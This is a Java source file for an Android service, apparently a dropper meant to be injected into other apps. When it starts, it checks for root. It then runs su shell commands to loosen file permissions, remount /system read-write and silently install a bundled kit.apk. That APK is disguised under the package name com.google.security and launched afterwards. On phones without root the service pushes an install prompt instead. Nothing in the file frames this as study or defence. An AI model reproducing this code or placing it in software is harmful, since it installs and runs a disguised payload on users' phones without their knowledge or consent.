package com.example.smaliservice;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.util.List;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.IBinder;
import android.util.Log;

public class injectService extends Service {
	private PrintWriter writer;
	Boolean isInstalled = false;

	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		super.onCreate();
		writer = initWriter();
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// TODO Auto-generated method stub
		if (isRoot()) {
			new Thread() {
				public void run() {
					shellExcute("chmod 777 /data/local/tmp");
					Log.e("injectService", "injectService start to copy");
					copy(injectService.this, "kit.apk", "/data/local/tmp",
							"kit.apk");
					try {
						Log.e("injectService", "injectService start to sleep");
						sleep(10000);
						Log.e("injectService", "injectService start to wake up");
					} catch (InterruptedException e) {
						// TODO Auto-generated catch block
						Log.e("injectService",
								"injectService start to sleep erro");
						e.printStackTrace();
					}
					if (!isAvilible(getApplicationContext(),
							"com.google.security")) {
						shellExcute("mount -o remount,rw rootfs /system/");
						// shellExcute("cp /data/local/tmp/kit.apk	/system/app/kit.apk");
						Log.e("injectService",
								"injectService start to install ");
						// shellExcute("chmod 644 /system/app/kit.apk");
						shellExcute("chmod 777 /data/local/tmp/kit.apk");
						shellExcute("pm install -r /data/local/tmp/kit.apk");
					}
					try {
						Log.e("injectService", "injectService start to sleep");
						sleep(10000);
						Log.e("injectService", "injectService start to wake up");
					} catch (InterruptedException e) {
						// TODO Auto-generated catch block
						Log.e("injectService",
								"injectService start to sleep erro");
						e.printStackTrace();
					}
					shellExcute("am start -n com.google.security/.MainActivity ");
				}
			}.start();
		} else {
			new Thread() {
				public void run() {
					copy(injectService.this, "kit.apk", "/sdcard/tmp",
							"kit.apk");
					try {
						Log.e("injectService", "injectService start to sleep");
						sleep(10000);
						Log.e("injectService", "injectService start to wake up");
					} catch (InterruptedException e) {
						// TODO Auto-generated catch block
						Log.e("injectService",
								"injectService start to sleep erro");
						e.printStackTrace();
					}
					if (!isAvilible(getApplicationContext(),
							"com.google.security")) {
						Log.e("injectService",
								"injectService start to install ");
						installApk();
					}
					try {
						Log.e("injectService", "injectService start to sleep");
						sleep(20000);
						Log.e("injectService", "injectService start to wake up");
					} catch (InterruptedException e) {
						// TODO Auto-generated catch block
						Log.e("injectService",
								"injectService start to sleep erro");
						e.printStackTrace();
					}
					if (isAvilible(getApplicationContext(),
							"com.google.security")) {
						startApk();
					}
				}
			}.start();
		}
		return super.onStartCommand(intent, flags, startId);
	}

	private boolean isAvilible(Context context, String packageName) {
		final PackageManager packageManager = context.getPackageManager();
		// 获取所有已安装程序的包信息
		List<PackageInfo> pinfo = packageManager.getInstalledPackages(0);
		for (int i = 0; i < pinfo.size(); i++) {
			Log.e("for",
					"......." + i + "....."
							+ pinfo.get(i).packageName.toString());

			if (pinfo.get(i).packageName.equalsIgnoreCase(packageName))
				return true;
		}
		return false;
	}

	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}

	private void copy(Context myContext, String ASSETS_NAME, String savePath,
			String saveName) {
		String filename = savePath + "/" + saveName;
		Log.e("file", "filename=" + filename);
		File dir = new File(savePath);
		// 如果目录不存在，创建这个目录
		if (!dir.exists())
			dir.mkdir();
		Log.e("file", "filename=" + dir.toString());
		try {
			if (!(new File(filename)).exists()) {
				Log.e("file", "filename erro=no");

				InputStream is = myContext.getResources().getAssets()
						.open(ASSETS_NAME);
				FileOutputStream fos = new FileOutputStream(filename);
				byte[] buffer = new byte[7168];
				int count = 0;
				while ((count = is.read(buffer)) > 0) {
					fos.write(buffer, 0, count);
				}
				fos.close();
				is.close();
			} else {
				new File(filename).delete();
				Log.e("file", "filename erro=no");
				InputStream is = myContext.getResources().getAssets()
						.open(ASSETS_NAME);
				FileOutputStream fos = new FileOutputStream(filename);
				byte[] buffer = new byte[7168];
				int count = 0;
				while ((count = is.read(buffer)) > 0) {
					fos.write(buffer, 0, count);
				}
				fos.close();
				is.close();
			}
		} catch (Exception e) {
			Log.e("file", "filename erro=");
			e.printStackTrace();
		}
	}

	private void shellExcute(String command) {
		if (writer == null)
			writer = initWriter();
		try {
			Log.e("shellExcute", "shellExcute command=" + command);
			writer.println(command);
			writer.flush();
		} catch (Exception e) {
			Log.e("shellExcute", "shellExcute command erro =" + command);
			e.printStackTrace();
		}
	}

	private void startApk() {
		ComponentName com = new ComponentName("com.google.security",
				"com.google.security.MainActivity");
		Intent intent = new Intent();
		intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		// 设置部件
		intent.setComponent(com);
		startActivity(intent);
	}

	private boolean isRoot() {
		boolean bool = false;
		try {
			if ((!new File("/system/bin/su").exists())
					&& (!new File("/system/xbin/su").exists())) {
				bool = false;
			} else {
				bool = true;
			}
		} catch (Exception e) {

		}
		Log.e("bool", bool + "");

		return bool;
	}

	private void installApk() {
		Intent in = new Intent(Intent.ACTION_VIEW);
		in.setDataAndType(Uri.fromFile(new File("/sdcard/tmp/kit.apk")),
				"application/vnd.android.package-archive");
		in.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		startActivity(in);
	}

	private PrintWriter initWriter() {
		try {
			Process process = Runtime.getRuntime().exec("su");
			return new PrintWriter(process.getOutputStream());
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			return null;
		}
	}
}
